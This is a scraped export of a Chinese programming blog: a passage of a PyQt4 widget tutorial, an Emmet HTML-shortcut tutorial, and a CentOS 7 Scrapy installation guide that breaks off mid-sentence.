self.setWindowIcon(QtGui.QIcon(&apos;footer-linkedin.png&apos;)) extractAction = QtGui.QAction(&quot;&amp;GET TO THE CHOPPAH!!&quot;, self) extractAction.setShortcut(&quot;Ctrl+Q&quot;) extractAction.setStatusTip(&quot;Leave the App&quot;) extractAction.triggered.connect(self.close_application) self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu(&apos;&amp;File&apos;) fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton(&apos;Quit&apos;, self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon(&apos;footer-linkedin.png&apos;), &quot;Flee the scene&quot;, self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar(&apos;Extraction&apos;) self.toolBar.addAction(extractAction) self.show() def close_application(self): choice = QtGui.QMessageBox.question(self, &quot;Extract!&quot;, # 对话框标题 &quot;Get into the chopper?&quot;, # 对话框内容 QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) # 对话框选项 # 对返回值进行判断 if choice == QtGui.QMessageBox.Yes: print(&quot;Extracting naaaaaooowwww!!&quot;) sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 7、复选框 check box（QCheckBox）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) checkBox = QtGui.QCheckBox('Enlarge Window', self) # 实例化一个复选框选项 checkBox.move(100, 25) # 改变复选框的位置 #checkBox.toggle() # 修改复选框的状态 checkBox.stateChanged.connect(self.enlarge_window) # 设置关联事件 self.show() def enlarge_window(self, state): # 在 connect 的时候，会自动绑定 state 参数 if state == QtCore.Qt.Checked: # 选中状态 self.setGeometry(50, 50, 1000, 600) else: # 非选中状态 self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 8、进度条 progress bar（QProgressBar）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) checkBox = QtGui.QCheckBox('Enlarge Window', self) checkBox.move(100, 25) #checkBox.toggle() checkBox.stateChanged.connect(self.enlarge_window) self.progress = QtGui.QProgressBar(self) # 实例化一个进度条控件 self.progress.setGeometry(200, 80, 250, 20) # 设置进度条控件的位置 self.btn = QtGui.QPushButton(\"Download\", self) # 实例化一个按钮，用于控制进度条 self.btn.move(200, 120) # 修改按钮的初始位置 self.btn.clicked.connect(self.download) # 设置按钮关联的事件 self.show() def download(self): self.completed = 0 # 用于记录进度条的进度 while self.completed &lt; 100: # 进度条最大值为 100 self.completed += 0.0001 # 递增进度 self.progress.setValue(self.completed) # 实时更新进度条的值 def enlarge_window(self, state): if state == QtCore.Qt.Checked: self.setGeometry(50, 50, 1000, 600) else: self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 9、下拉菜单 drop down combobox（QComboBox）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) self.statusBar() # 这个方法必须要 QtGui.QMainWindow 这个类才有，QDialog 不存在这个方法 mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) checkBox = QtGui.QCheckBox('Enlarge Window', self) checkBox.move(100, 25) #checkBox.toggle() checkBox.stateChanged.connect(self.enlarge_window) self.progress = QtGui.QProgressBar(self) self.progress.setGeometry(200, 80, 250, 20) self.btn = QtGui.QPushButton(\"Download\", self) self.btn.move(200, 120) self.btn.clicked.connect(self.download) print(self.style().objectName()) # 输出当前的样式名称 self.styleChoice = QtGui.QLabel(\"Windows Vista\", self) # 这是一个标签对象 comboBox = QtGui.QComboBox(self) # 实例化一个下拉菜单 comboBox.addItem(\"motif\") # 为下拉菜单添加各种选项 comboBox.addItem(\"Windows\") comboBox.addItem(\"cde\") comboBox.addItem(\"Plastique\") comboBox.addItem(\"Cleanlooks\") comboBox.addItem(\"windowsvista\") comboBox.move(50, 250) # 修改下拉菜单的位置 self.styleChoice.move(50, 150) # Python 高级特性，能将选项中的文本作为列表标识，并作为参数连接到指定方法 comboBox.activated[str].connect(self.style_choice) self.show() def style_choice(self, text): self.styleChoice.setText(text) # 更新标签中的文本内容 QtGui.QApplication.setStyle(QtGui.QStyleFactory.create(text)) # 全局设置 UI 样式 def download(self): self.completed = 0 while self.completed &lt; 100: self.completed += 0.0001 self.progress.setValue(self.completed) def enlarge_window(self, state): if state == QtCore.Qt.Checked: self.setGeometry(50, 50, 1000, 600) else: self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 10、字体选择器 font widget（QFontDialog）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) fontChoice = QtGui.QAction(\"Font\", self) # 新建一个动作按钮 fontChoice.triggered.connect(self.font_choice) # 链接到 font_choice 方法 #self.toolBar = self.addToolBar('Font') self.toolBar.addAction(fontChoice) # 将该动作按钮添加到工具栏 checkBox = QtGui.QCheckBox('Enlarge Window', self) checkBox.move(100, 25) #checkBox.toggle() checkBox.stateChanged.connect(self.enlarge_window) self.progress = QtGui.QProgressBar(self) self.progress.setGeometry(200, 80, 250, 20) self.btn = QtGui.QPushButton(\"Download\", self) self.btn.move(200, 120) self.btn.clicked.connect(self.download) print(self.style().objectName()) self.styleChoice = QtGui.QLabel(\"Windows Vista\", self) comboBox = QtGui.QComboBox(self) comboBox.addItem(\"motif\") comboBox.addItem(\"Windows\") comboBox.addItem(\"cde\") comboBox.addItem(\"Plastique\") comboBox.addItem(\"Cleanlooks\") comboBox.addItem(\"windowsvista\") comboBox.move(50, 250) self.styleChoice.move(50, 150) comboBox.activated[str].connect(self.style_choice) self.show() def font_choice(self): font, valid = QtGui.QFontDialog.getFont() # 调用内置的字体选择对话框，并用两个变量接收返回值 if valid: self.styleChoice.setFont(font) # 修改当前字体 def style_choice(self, text): self.styleChoice.setText(text) QtGui.QApplication.setStyle(QtGui.QStyleFactory.create(text)) def download(self): self.completed = 0 while self.completed &lt; 100: self.completed += 0.0001 self.progress.setValue(self.completed) def enlarge_window(self, state): if state == QtCore.Qt.Checked: self.setGeometry(50, 50, 1000, 600) else: self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 11、颜色选择器与日历控件 color pickup widget and calendar（QColorDialog, QCalendarWidget）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) fontChoice = QtGui.QAction(\"Font\", self) fontChoice.triggered.connect(self.font_choice) #self.toolBar = self.addToolBar('Font') self.toolBar.addAction(fontChoice) color = QtGui.QColor(0, 0, 0) # 实例化一个 Qt 颜色 fontColor = QtGui.QAction(\"Font bg Color\", self) # 实例化一个动作按钮 fontColor.triggered.connect(self.color_picker) # 将动作按钮关联到 color_picker 方法 self.toolBar.addAction(fontColor) # 将该动作按钮添加到工具栏 checkBox = QtGui.QCheckBox('Enlarge Window', self) checkBox.move(300, 25) #checkBox.toggle() checkBox.stateChanged.connect(self.enlarge_window) self.progress = QtGui.QProgressBar(self) self.progress.setGeometry(200, 80, 250, 20) self.btn = QtGui.QPushButton(\"Download\", self) self.btn.move(200, 120) self.btn.clicked.connect(self.download) print(self.style().objectName()) self.styleChoice = QtGui.QLabel(\"Windows Vista\", self) comboBox = QtGui.QComboBox(self) comboBox.addItem(\"motif\") comboBox.addItem(\"Windows\") comboBox.addItem(\"cde\") comboBox.addItem(\"Plastique\") comboBox.addItem(\"Cleanlooks\") comboBox.addItem(\"windowsvista\") comboBox.move(50, 250) self.styleChoice.move(50, 150) comboBox.activated[str].connect(self.style_choice) # 这里也还演示了一个日历控件，通过勾选 enlarge window 可以看见 cal = QtGui.QCalendarWidget(self) cal.move(500, 200) cal.resize(200, 200) self.show() def color_picker(self): color = QtGui.QColorDialog.getColor() # 调用 Qt 内置的颜色选择器 # Qt 也使用 StyleSheet，所以可以通过类似 CSS 修改样式的方法，修改标签文本框的背景颜色 self.styleChoice.setStyleSheet(\"QWidget &#123; background-color: %s &#125;\" % color.name()) def font_choice(self): font, valid = QtGui.QFontDialog.getFont() if valid: self.styleChoice.setFont(font) def style_choice(self, text): self.styleChoice.setText(text) QtGui.QApplication.setStyle(QtGui.QStyleFactory.create(text)) def download(self): self.completed = 0 while self.completed &lt; 100: self.completed += 0.0001 self.progress.setValue(self.completed) def enlarge_window(self, state): if state == QtCore.Qt.Checked: self.setGeometry(50, 50, 1000, 600) else: self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 12、文本编辑器 editor textedit（QTextEdit）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) openEditor = QtGui.QAction(\"&amp;Editor\", self) # 实例化一个动作按钮 openEditor.setShortcut(\"Ctrl+E\") # 设置快捷键 openEditor.setStatusTip(\"Open Editor\") # 设置状态提示信息 openEditor.triggered.connect(self.editor) # 链接到 editor 方法 self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) editorMenu = mainMenu.addMenu(\"&amp;Editor\") # 在主菜单上新增一个列 editorMenu.addAction(openEditor) # 将动作按钮添加进 Editor 菜单 self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) fontChoice = QtGui.QAction(\"Font\", self) fontChoice.triggered.connect(self.font_choice) #self.toolBar = self.addToolBar('Font') self.toolBar.addAction(fontChoice) color = QtGui.QColor(0, 0, 0) fontColor = QtGui.QAction(\"Font bg Color\", self) fontColor.triggered.connect(self.color_picker) self.toolBar.addAction(fontColor) checkBox = QtGui.QCheckBox('Enlarge Window', self) checkBox.move(300, 25) #checkBox.toggle() checkBox.stateChanged.connect(self.enlarge_window) self.progress = QtGui.QProgressBar(self) self.progress.setGeometry(200, 80, 250, 20) self.btn = QtGui.QPushButton(\"Download\", self) self.btn.move(200, 120) self.btn.clicked.connect(self.download) print(self.style().objectName()) self.styleChoice = QtGui.QLabel(\"Windows Vista\", self) comboBox = QtGui.QComboBox(self) comboBox.addItem(\"motif\") comboBox.addItem(\"Windows\") comboBox.addItem(\"cde\") comboBox.addItem(\"Plastique\") comboBox.addItem(\"Cleanlooks\") comboBox.addItem(\"windowsvista\") comboBox.move(50, 250) self.styleChoice.move(50, 150) comboBox.activated[str].connect(self.style_choice) cal = QtGui.QCalendarWidget(self) cal.move(500, 200) cal.resize(200, 200) self.show() def color_picker(self): color = QtGui.QColorDialog.getColor() self.styleChoice.setStyleSheet(\"QWidget &#123; background-color: %s &#125;\" % color.name()) def editor(self): self.textEdit = QtGui.QTextEdit() # 实例化一个 Qt 内置文本编辑器对象 self.setCentralWidget(self.textEdit) # 将该编辑器设置为窗体的中央主控件 def font_choice(self): font, valid = QtGui.QFontDialog.getFont() if valid: self.styleChoice.setFont(font) def style_choice(self, text): self.styleChoice.setText(text) QtGui.QApplication.setStyle(QtGui.QStyleFactory.create(text)) def download(self): self.completed = 0 while self.completed &lt; 100: self.completed += 0.0001 self.progress.setValue(self.completed) def enlarge_window(self, state): if state == QtCore.Qt.Checked: self.setGeometry(50, 50, 1000, 600) else: self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图 13、文件选择器 file picker（QFileDialog）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163# coding: utf-8import sysfrom PyQt4 import QtGui, QtCoreclass Window(QtGui.QMainWindow): def __init__(self): super(Window, self).__init__() self.setGeometry(50, 50, 500, 300) self.setWindowTitle('PyQT menubar tuts') self.setWindowIcon(QtGui.QIcon('footer-linkedin.png')) extractAction = QtGui.QAction(\"&amp;GET TO THE CHOPPAH!!\", self) extractAction.setShortcut(\"Ctrl+Q\") extractAction.setStatusTip(\"Leave the App\") extractAction.triggered.connect(self.close_application) openEditor = QtGui.QAction(\"&amp;Editor\", self) openEditor.setShortcut(\"Ctrl+E\") openEditor.setStatusTip(\"Open Editor\") openEditor.triggered.connect(self.editor) openFile = QtGui.QAction(\"&amp;Open File\", self) # 实例化一个打开文件动作按钮 openFile.setShortcut(\"Ctrl+O\") # 设置快捷键 openFile.setStatusTip(\"Open File\") # 设置状态提示信息 openFile.triggered.connect(self.file_open) # 链接 file_open 方法 saveFile = QtGui.QAction(\"&amp;Save File\", self) # 实例化一个保存文件动作按钮 saveFile.setShortcut(\"Ctrl+S\") # 设置快捷键 saveFile.setStatusTip(\"Save File\") # 设置状态提示信息 saveFile.triggered.connect(self.file_save) # 链接 file_save 方法 self.statusBar() mainMenu = self.menuBar() fileMenu = mainMenu.addMenu('&amp;File') fileMenu.addAction(extractAction) fileMenu.addAction(openFile) # 给文件菜单新增打开文件选项 fileMenu.addAction(saveFile) # 给文件菜单新增保存文件选项 editorMenu = mainMenu.addMenu(\"&amp;Editor\") editorMenu.addAction(openEditor) self.home() def home(self): btn = QtGui.QPushButton('Quit', self) btn.clicked.connect(self.close_application) btn.resize(btn.minimumSizeHint()) btn.move(100, 100) extractAction = QtGui.QAction(QtGui.QIcon('footer-linkedin.png'), \"Flee the scene\", self) extractAction.triggered.connect(self.close_application) self.toolBar = self.addToolBar('Extraction') self.toolBar.addAction(extractAction) fontChoice = QtGui.QAction(\"Font\", self) fontChoice.triggered.connect(self.font_choice) #self.toolBar = self.addToolBar('Font') self.toolBar.addAction(fontChoice) color = QtGui.QColor(0, 0, 0) fontColor = QtGui.QAction(\"Font bg Color\", self) fontColor.triggered.connect(self.color_picker) self.toolBar.addAction(fontColor) checkBox = QtGui.QCheckBox('Enlarge Window', self) checkBox.move(300, 25) #checkBox.toggle() checkBox.stateChanged.connect(self.enlarge_window) self.progress = QtGui.QProgressBar(self) self.progress.setGeometry(200, 80, 250, 20) self.btn = QtGui.QPushButton(\"Download\", self) self.btn.move(200, 120) self.btn.clicked.connect(self.download) print(self.style().objectName()) self.styleChoice = QtGui.QLabel(\"Windows Vista\", self) comboBox = QtGui.QComboBox(self) comboBox.addItem(\"motif\") comboBox.addItem(\"Windows\") comboBox.addItem(\"cde\") comboBox.addItem(\"Plastique\") comboBox.addItem(\"Cleanlooks\") comboBox.addItem(\"windowsvista\") comboBox.move(50, 250) self.styleChoice.move(50, 150) comboBox.activated[str].connect(self.style_choice) cal = QtGui.QCalendarWidget(self) cal.move(500, 200) cal.resize(200, 200) self.show() def file_save(self): name = QtGui.QFileDialog.getSaveFileName(self, \"Save File\") # 调用 Qt 内置的文件选择器对话框的保存方法 file = open(name, \"w\") # 用写方式打开文件 text = self.textEdit.toPlainText() # 转换 textEdit 中的文本内容 file.write(text) # 将文本内容写入文件 file.close() # 关闭 file def file_open(self): name = QtGui.QFileDialog.getOpenFileName(self, 'Open File') # 调用 Qt 内置的文件选择器对话框的打开方法 file = open(name, 'r') # 用读方式打开文件 self.editor() # 启用编辑器 with file: # 读取文件中的所有文本 text = file.read() self.textEdit.setText(text) def color_picker(self): color = QtGui.QColorDialog.getColor() self.styleChoice.setStyleSheet(\"QWidget &#123; background-color: %s &#125;\" % color.name()) def editor(self): self.textEdit = QtGui.QTextEdit() self.setCentralWidget(self.textEdit) def font_choice(self): font, valid = QtGui.QFontDialog.getFont() if valid: self.styleChoice.setFont(font) def style_choice(self, text): self.styleChoice.setText(text) QtGui.QApplication.setStyle(QtGui.QStyleFactory.create(text)) def download(self): self.completed = 0 while self.completed &lt; 100: self.completed += 0.0001 self.progress.setValue(self.completed) def enlarge_window(self, state): if state == QtCore.Qt.Checked: self.setGeometry(50, 50, 1000, 600) else: self.setGeometry(50, 50, 500, 300) def close_application(self): choice = QtGui.QMessageBox.question(self, \"Extract!\", \"Get into the chopper?\", QtGui.QMessageBox.Yes | QtGui.QMessageBox.No) if choice == QtGui.QMessageBox.Yes: print(\"Extracting naaaaaooowwww!!\") sys.exit() else: passdef run(): app = QtGui.QApplication(sys.argv) GUI = Window() sys.exit(app.exec_())run() 效果图","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[]},{"title":"Emmet 插件快速入门","slug":"86","date":"2015-08-16T00:12:00.000Z","updated":"2018-06-08T07:07:53.000Z","comments":true,"path":"archives/fast-learning-plugin-emmet.html","link":"","permalink":"https://hexo.bangz.me/archives/fast-learning-plugin-emmet.html","excerpt":"Emmet 插件是一款能够大幅度提升网页前端开发效率的插件，能通过简单的语法快速生成一个标签结构 现在很多的文本编辑器都支持了 Emmet 插件了，像 Zend，Sublime 等都支持 本人用 Sublime Text 3，在 package control 中就能安装 Emmet 插件了 下面来简单笔记几种常见的用法 快速生成一个 3 行 4 列的 table 表格结构1table&gt;tr*3&gt;td*4 输入完之后按 tab 键即可生成代码","text":"Emmet 插件是一款能够大幅度提升网页前端开发效率的插件，能通过简单的语法快速生成一个标签结构 现在很多的文本编辑器都支持了 Emmet 插件了，像 Zend，Sublime 等都支持 本人用 Sublime Text 3，在 package control 中就能安装 Emmet 插件了 下面来简单笔记几种常见的用法 快速生成一个 3 行 4 列的 table 表格结构1table&gt;tr*3&gt;td*4 输入完之后按 tab 键即可生成代码1234567891011121314151617181920&lt;table&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;td&gt;&lt;/td&gt; &lt;/tr&gt;&lt;/table&gt; 快速生成一个 h1 标题1h1&#123;hello&#125; 按 tab 键即可生成 html 代码1&lt;h1&gt;hello&lt;/h1&gt; 快速生成一个超链接1a[href=&quot;me.mo-cloud.net&quot;]&#123; 链接到本站 &#125; 按 tab 键生成 html 代码1&lt;a href=\"me.mo-cloud.net\"&gt; 链接到本站 < span class=\"tag\">&lt;/a&gt; 生成一个无序列表，套用编号过的 class 属性1ul&gt;li.item$&#123;haha $$&#125;*9 按 tab 键生成 html 代码1234567891011&lt;ul&gt; &lt;li class=\"item1\"&gt;haha 01&lt;/li&gt; &lt;li class=\"item2\"&gt;haha 02&lt;/li&gt; &lt;li class=\"item3\"&gt;haha 03&lt;/li&gt; &lt;li class=\"item4\"&gt;haha 04&lt;/li&gt; &lt;li class=\"item5\"&gt;haha 05&lt;/li&gt; &lt;li class=\"item6\"&gt;haha 06&lt;/li&gt; &lt;li class=\"item7\"&gt;haha 07&lt;/li&gt; &lt;li class=\"item8\"&gt;haha 08&lt;/li&gt; &lt;li class=\"item9\"&gt;haha 09&lt;/li&gt;&lt;/ul&gt; 生成两个并列的下拉列表，使用稍微复杂的组合属性1(select&gt;.wrap&gt;h1&gt;p&gt;a)+(select&gt;.huh&gt;p+p) 按 tab 键生成代码123456789101112&lt;select name=\"\" id=\"\"&gt; &lt;option class=\"wrap\"&gt; &lt;h1&gt; &lt;p&gt;&lt;a href=\"\"&gt;&lt;/a&gt;&lt;/p&gt; &lt;/h1&gt; &lt;/option&gt;&lt;/select&gt;&lt;select name=\"\" id=\"\"&gt; &lt;option class=\"huh\"&gt; &lt;p&gt;&lt;/p&gt; &lt;p&gt;&lt;/p&gt; &lt;/option&gt;&lt;/select&gt;","categories":[{"name":"技术研究","slug":"技术研究","permalink":"https://hexo.bangz.me/categories/技术研究/"}],"tags":[{"name":"HTML5","slug":"HTML5","permalink":"https://hexo.bangz.me/tags/HTML5/"}]},{"title":"CentOS 7 上安装 python 爬虫框架 Scrapy","slug":"84","date":"2015-06-28T22:18:00.000Z","updated":"2018-06-08T09:11:17.000Z","comments":true,"path":"archives/setup-python-scrapy-framework-on-centos-7.html","link":"","permalink":"https://hexo.bangz.me/archives/setup-python-scrapy-framework-on-centos-7.html","excerpt":"最近听说 Python 写爬虫很厉害，想体验一下 于是我就抱着这样的心态开始了我的 Scrapy 之旅 第一步当然是 Scrapy 的安装了，这玩意我发现在 windows 下倒是挺好装的，照着教程一路走就行了 官方的安装教程在这 http://doc.scrapy.org/en/latest/intro/install.html 想要麻烦点的话可以看开源中国的某大神写的教程 http://my.oschina.net/dragonblog/blog/173290","text":"最近听说 Python 写爬虫很厉害，想体验一下 于是我就抱着这样的心态开始了我的 Scrapy 之旅 第一步当然是 Scrapy 的安装了，这玩意我发现在 windows 下倒是挺好装的，照着教程一路走就行了 官方的安装教程在这 http://doc.scrapy.org/en/latest/intro/install.html 想要麻烦点的话可以看开源中国的某大神写的教程 http://my.oschina.net/dragonblog/blog/173290 整个 Scrapy 的环境依赖如下：1234Python 2.7pip and setuptools Python packages. Nowadays pip requires and installs setuptools if not installed.lxml. Most Linux distributions ships prepackaged versions of lxml. Otherwise refer to http://lxml.de/installation.htmlOpenSSL. This comes preinstalled in all operating systems, except Windows where the Python installer ships it bundled. 这里我重点想说的不是 windows 下的安装，而是在 RedHat 系的 CentOS 下的安装，遇到了很多问题 之前看官方教程的时候看得快，一眼晃过去以为说非要 2.7.9 才能安装 scrapy1Python 2.7.9 and later 于是下载了个 Python2.7.9 的源代码下来编译安装，结果出了一大堆问题又因为 yum 本身就是基于 python 的，他们的那个 python2.7.5 是经过特殊扩展之后才发布的，所以装 2.7.9 的时候差点把 yum 也搞坏了 后来仔细一看，上面写着1pip included with Python 顿时就无语了，它的意思是说，在 2.7.9 版本之后，Python 都自带了 pip，好吧，怪我眼瞎，正确的安装方式如下 python 是 CentOS 自带的，所以就不用再重复安装了 直接去下载 get-pip.py1wget -c https://bootstrap.pypa.io/get-pip.py 下载完之后执行安装即可1python get-pip.py 装完之后直接输入 pip 回车看看，如果有显示参数列表的话就说明安装成功了 接着安装 setuptools 和 lxml12pip install -U setuptoolspip install lxml 要是遇到了说找不到 python.h 的话，要先装一下 python 开发工具包1yum -y install python-devel 如果出现说没有找到合适的 C Compiler 的话，装一下 gcc 即可1yum -y install gcc 装完 setuptools 和 lxml 之后 可以安装 openssl 了，这里建议把 devel 也装上1yum -y install openssl openssl-devel 弄完之后最后就把 Scrapy 